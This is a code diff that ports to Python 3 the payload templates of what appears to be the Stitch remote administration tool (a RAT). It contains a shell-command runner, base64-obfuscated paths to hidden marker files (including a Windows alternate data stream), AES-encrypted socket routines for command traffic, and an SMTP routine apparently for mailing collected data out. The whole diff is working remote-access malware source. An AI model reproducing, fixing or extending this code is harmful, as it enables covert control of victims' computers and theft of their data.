@@ -224,6 +224,8 @@ T = False
 def run_command({4}):
     subp = sp.Popen({4},shell=True,stdout=sp.PIPE,stderr=sp.PIPE)
     {0}, {5} = subp.communicate()
+    {0} = {0}.decode('utf-8', errors='replace')
+    {5} = {5}.decode('utf-8', errors='replace')
     if not {5}:
         if {0} == '':
             return "[+] Command successfully executed.\\n"
@@ -331,14 +333,14 @@ def stitch_running():
     if {9}.endswith('.py') or {9}.endswith('.pyc'):
         {9} = 'python.exe'
     if win_client():
-        {7} = base64.b64decode('QzpcV2luZG93c1xUZW1wOnN0c2hlbGwubG9n')
+        {7} = base64.b64decode('QzpcV2luZG93c1xUZW1wOnN0c2hlbGwubG9n').decode()
     else:
-        {7} = base64.b64decode('L3RtcC8uc3RzaGVsbC5sb2c=')
+        {7} = base64.b64decode('L3RtcC8uc3RzaGVsbC5sb2c=').decode()
     if os.path.exists({7}):
         with open({7},'r') as st:
             data = st.readlines()
             data[0] = str(data[0]).strip()
-        if data[0] == {8}:
+        if data[0] == str({8}):
             if data[1] == {9}:
                 return True
         if win_client():
@@ -469,6 +471,8 @@ abbrev = '{2}'
 {0} = base64.b64decode('{1}')
 
 def encrypt(raw):
+    if isinstance(raw, str):
+        raw = raw.encode('latin-1')
     iv = Random.new().read( AES.block_size )
     cipher = AES.new({0}, AES.MODE_CFB, iv )
     return (base64.b64encode( iv + cipher.encrypt( raw ) ) )
@@ -491,7 +495,7 @@ import struct
 from st_encryption import *
 
 st_eof = base64.b64decode('c3RpdGNoNjI2aGN0aXRz')
-st_complete = base64.b64decode('c3RpdGNoLjpjb21wbGV0ZTouY2h0aXRz')
+st_complete = base64.b64decode('c3RpdGNoLjpjb21wbGV0ZTouY2h0aXRz').decode('latin-1')
 
 def recvall(sock, count, size=False):
     buf = b''
@@ -504,6 +508,8 @@ def recvall(sock, count, size=False):
     else: return decrypt(buf)
 
 def send(sock, data, encryption=True):
+    if isinstance(data, str):
+        data = data.encode('latin-1')
     while data:
         if encryption:
             cmd = encrypt(data[:1024])
@@ -522,7 +528,7 @@ def send(sock, data, encryption=True):
     sock.sendall(eof)
 
 def receive(sock,silent=False,timeout=True):
-    full_response=''
+    full_response=b''
     while True:
         lengthbuf = recvall(sock, 4, size=True)
         length, = struct.unpack('!i', lengthbuf)
@@ -531,7 +537,7 @@ def receive(sock,silent=False,timeout=True):
             full_response += response
         else:
             break
-    return full_response
+    return full_response.decode('latin-1')
 '''
 
 ################################################################################
@@ -927,7 +933,7 @@ import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email.mime.text import MIMEText
-from email import Encoders
+from email import encoders as Encoders
 '''
 
 def get_email(user,pwd):
@@ -936,7 +942,7 @@ import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email.mime.text import MIMEText
-from email import Encoders
+from email import encoders as Encoders
 
 hour = int(strftime("%H"))
 am_pm = "AM"
